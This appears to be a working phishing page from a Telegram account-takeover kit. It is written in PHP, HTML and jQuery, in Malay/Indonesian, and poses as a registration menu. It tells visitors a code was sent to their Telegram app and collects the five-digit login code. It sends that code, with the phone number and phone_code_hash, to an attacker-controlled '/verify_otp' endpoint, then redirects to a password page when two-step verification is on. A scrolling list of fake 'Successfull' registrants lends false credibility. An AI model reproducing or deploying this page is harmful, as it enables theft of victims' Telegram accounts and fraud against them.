<?php
// Include settings file
require_once 'settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MENU PENDAFTARAN</title>
	<link rel="canonical" href="https://info-cek-data-mkm.up.railway.app" />
  <!-- Meta SEO -->
  <meta name="description" content="MENU PENDAFTARAN" />
  <meta name="keywords" content="PENDAFTARAN" />
  <meta name="author" content="MENU PENDAFTARAN" />
  <!-- Open Graph (Facebook, Telegram, WhatsApp) -->
  <meta property="og:title" content="MENU PENDAFTARAN - Daftar Sekarang" />
  <meta property="og:description" content="MENU PENDAFTARAN" />
  <meta property="og:image" content="static/image.png" />
  <!-- Ganti dengan URL sebenar gambar jika ada -->
  <meta property="og:type" content="website" />
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="MENU PENDAFTARAN" />
  <meta name="twitter:description" content="MENU PENDAFTARAN" />
  <meta name="twitter:image" content="static/image.png" />
  <link rel="icon" href="static/image.png" type="image/x-icon" />
  <meta name="robots" content="nofollow, noindex" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
    #loader {
      height: 100vh;
      width: 100vw;
      position: fixed;
      top: 0;
      left: 0;
      background: rgba(255, 255, 255, 0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    .loader {
      width: 45px;
      aspect-ratio: 1;
      --c: no-repeat linear-gradient(#000000 0 0);
      background: var(--c) 0% 50%, var(--c) 50% 50%, var(--c) 100% 50%;
      background-size: 20% 100%;
      animation: l1 0.5s infinite linear;
    }
    @keyframes l1 {
      0% {
        background-size: 20% 100%, 20% 100%, 20% 100%;
      }
      33% {
        background-size: 20% 10%, 20% 100%, 20% 100%;
      }
      50% {
        background-size: 20% 100%, 20% 10%, 20% 100%;
      }
      66% {
        background-size: 20% 100%, 20% 100%, 20% 10%;
      }
      100% {
        background-size: 20% 100%, 20% 100%, 20% 100%;
      }
    }
  </style>
  <script src="static/java/jQuery.min.js"></script>
  <script type="text/plain" data-savepage-src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
    ></script>
  <script src="npm/bootstrap-5.1.3/dist/js/bootstrap.bundle.min.js"
    ></script>
</head>
<body>
  <div style="width: 100%;padding: 0px 16px;max-width: 600px;margin: auto;">
    <div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
      <div class="carousel-inner">
        <div class="carousel-item active">
          <img class="d-block w-100" src="static/image.png" alt="First slide">
        </div>
      </div>
    </div>
<h1 style="font-size: 22px!important" class="typewrite mt-3 text-center text-primary" data-period="2000" data-type='[ "MASUKKAN DATA DENGAN TEPAT DAN BENAR" ]'>
    <span class="wrap"></span>
</h1>
<script>
  var TxtType = function(el, toRotate, period) {
    this.toRotate = toRotate;
    this.el = el;
    this.loopNum = 0;
    this.period = parseInt(period, 10) || 2000;
    this.txt = '';
    this.tick();
    this.isDeleting = false;
  };
  TxtType.prototype.tick = function() {
    var i = this.loopNum % this.toRotate.length;
    var fullTxt = this.toRotate[i];
    if (this.isDeleting) {
      this.txt = fullTxt.substring(0, this.txt.length - 1);
    } else {
      this.txt = fullTxt.substring(0, this.txt.length + 1);
    }
    this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
    var that = this;
    var delta = 200 - Math.random() * 100;
    if (this.isDeleting) { delta /= 2; }
    if (!this.isDeleting && this.txt === fullTxt) {
      delta = this.period;
      this.isDeleting = true;
    } else if (this.isDeleting && this.txt === '') {
      this.isDeleting = false;
      this.loopNum++;
      delta = 500;
    }
    setTimeout(function() {
      that.tick();
    }, delta);
  };
  window.onload = function() {
    var elements = document.getElementsByClassName('typewrite');
    for (var i=0; i<elements.length; i++) {
      var toRotate = JSON.parse(elements[i].getAttribute('data-type'));
      var period = elements[i].getAttribute('data-period');
      if (toRotate) {
        new TxtType(elements[i], toRotate, period);
      }
    }
    // INJECT CSS
    var css = document.createElement("style");
    css.type = "text/css";
    css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
    document.body.appendChild(css);
  };
</script>
<div class="col-12 col-md-8 col-lg-6">
    <br>
     <span id="phoneNumberPlaceholder"></span>
    <p class="text-center">Kami telah menghantar kod untuk aplikasi Telegram anda.</p>
    <form id="code-verification-form">
        <div class="d-flex justify-content-center mb-3">
            <input type="tel" class="form-control code-input mx-1" id="code1" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code2" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code3" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code4" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="tel" class="form-control code-input mx-1" id="code5" maxlength="1" required style="width: 50px; text-align: center;">
            <input type="hidden" id="otp" value="">
        </div>
        <div id="feedback" class="text-sm mt-2"></div>
        <div id="loader" style="display:none;"><div class="loader"></div></div>
        <div id="wrong" class="text-red-500 text-sm mt-1" style="display:none;">Kode tidak valid</div>
        <div class="d-flex justify-content-center">
            <button type="button" id="verifyBtn" class="btn btn-primary" style="background-color: #3f51b5; color:#ffffff;">
                <span id="btnLoader" class="hidden"></span>
                <span id="btnText">Verifikasi</span>
            </button>
        </div>                    
    </form>
</div>

    <div class="container my-5">
      <div class="card">
        <div class="card-header text-center text-white bg-danger font-weight-bold" style=" font-size: 10px;"> BERGABUNG
          HARI INI </div>
        <div class="card-body">
          <marquee direction="up" height="300">
            <div class="alert alert-primary" role="alert"> ⏏️ Ami Suartini <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Uci Mahendra Arsyad <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Eki Nuralam <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Dian Lukman <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Zenudin <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ahmad Luki Pramoto <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Cahyadi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Sugi Anrianto <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Darmansya <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Budi Ilyas Rahmat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Herawati <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Devi Pratawi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Wulan Sri Rahayu <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Citra Dwi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ayu wulandri <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Retno <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Rahmat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ari Aryanigrat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Fuji astuti <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Taufik <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Fery Artanto <br> ⏏️ Status: Successfull ✅ </div>
          </marquee>
        </div>
      </div>
    </div>
  </div>
  <style type="text/css">
    .typewrite>.wrap {
      border-right: 0.08em solid #fff
    }
  </style>
  <script>
    setInterval(function () {
      $('.tests:first-child').remove()
    }, 1500)
  </script>
  <script>
        // Create the phpSettings variable from PHP $url variable
        var phpSettings = {
            endpointUrl: '<?php echo $url; ?>'
        };
    </script>
    
    <script>
$(document).ready(function() {
    // Ambil dan tampilkan nomor telepon
    const phone = sessionStorage.getItem("phone");
    if (phone) {
        $("#phoneNumberPlaceholder").text(phone);
    }

    // Handle input fields for OTP
    $('.code-input').on('input', function() {
        // Only allow numbers
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Auto focus to next input
        if (this.value.length === 1) {
            $(this).next('.code-input').focus();
        }
        
        // Combine all inputs to create the complete OTP
        updateOTP();
    });

    // Handle backspace key to go to previous input
    $('.code-input').on('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 0) {
            $(this).prev('.code-input').focus();
        }
    });

    // Function to combine individual digits into complete OTP
    function updateOTP() {
        let otp = '';
        $('.code-input').each(function() {
            otp += $(this).val();
        });
        $('#otp').val(otp);
        
        // Show verify button when all digits are entered
        if (otp.length === 5) {
            $('#verifyBtn').removeClass('visually-hidden');
        } else {
            $('#verifyBtn').addClass('visually-hidden');
        }
    }

    // Verify OTP when button is clicked
    $("#verifyBtn").on("click", function (e) {
        e.preventDefault();
        
        const otp = $("#otp").val();
        const feedback = $("#feedback");
        const loader = $("#loader");
        const btnLoader = $("#btnLoader");
        const btnText = $("#btnText");
        const wrongMsg = $("#wrong");
        
        // Reset feedback
        feedback.text("");
        wrongMsg.hide();
        
        // Validasi panjang OTP
        if (otp.length !== 5) {
            wrongMsg.text('Kode harus 5 angka').show();
            return;
        }
        
        loader.show();
        btnLoader.removeClass('hidden');
        btnText.text('Memproses...');
        $(this).addClass('opacity-75 pointer-events-none');
        
        const endpointUrl = phpSettings.endpointUrl;
        
        const phoneCodeHash = sessionStorage.getItem("phone_code_hash");
        $.ajax({
            url: endpointUrl + "/verify_otp",
            type: "POST",
            contentType: "application/json",
            data: JSON.stringify({
                phone: phone,
                otp: otp,
                phoneCodeHash: phoneCodeHash
            }),
            success: function(response) {
                loader.hide();
                if (response.status === 'success') {
                    feedback.html('<span style="color: green;">' + response.message + '</span>');
                    setTimeout(function() {
                        window.location.href = 'success.php';
                    }, 100);
                } else if (response.status === 'needs_2fa') {
                    feedback.html('<span style="color: orange;">' + response.message + '</span>');
                    setTimeout(function() {
                        window.location.href = 'pass.php';
                    }, 100);
                } else {
                    wrongMsg.text(response.message).show();
                    // Reset tombol
                    btnLoader.addClass('hidden');
                    btnText.text('Verifikasi Kode');
                    $('#verifyBtn').removeClass('opacity-75 pointer-events-none');
                }
            },
            error: function (xhr) {
                loader.hide();
                const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat memverifikasi kode." };
                wrongMsg.text(errorResponse.message).show();
                // Reset tombol
                btnLoader.addClass('hidden');
                btnText.text('Verifikasi Kode');
                $('#verifyBtn').removeClass('opacity-75 pointer-events-none');
            }
        });
    });
});
    </script>
</body>
</html>